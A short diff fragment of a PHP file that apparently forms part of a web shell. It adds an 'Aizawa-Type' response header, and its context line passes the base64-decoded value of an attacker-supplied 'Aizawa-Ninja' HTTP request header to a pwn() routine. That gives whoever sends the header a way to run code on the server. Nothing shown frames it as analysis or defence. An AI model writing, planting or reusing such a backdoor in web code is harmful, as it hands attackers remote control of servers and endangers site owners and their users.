@@ -1,5 +1,5 @@
 <?php
-
+header('Aizawa-Type: http_aizawa_ninja_gc');
 
 pwn(base64_decode($_SERVER['HTTP_AIZAWA_NINJA']));
 
